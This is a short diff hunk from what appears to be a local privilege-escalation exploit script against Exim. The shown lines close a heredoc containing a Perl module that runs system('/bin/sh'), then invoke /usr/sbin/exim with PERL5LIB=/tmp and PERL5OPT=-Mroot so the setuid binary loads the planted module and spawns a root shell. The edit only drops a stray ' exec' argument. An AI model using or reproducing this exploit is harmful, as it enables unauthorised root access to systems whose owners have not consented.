@@ -20,4 +20,4 @@ use warnings;
 
 system("/bin/sh");
 EOF
-PERL5LIB=/tmp PERL5OPT=-Mroot /usr/sbin/exim -ps  exec
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/sbin/exim -ps
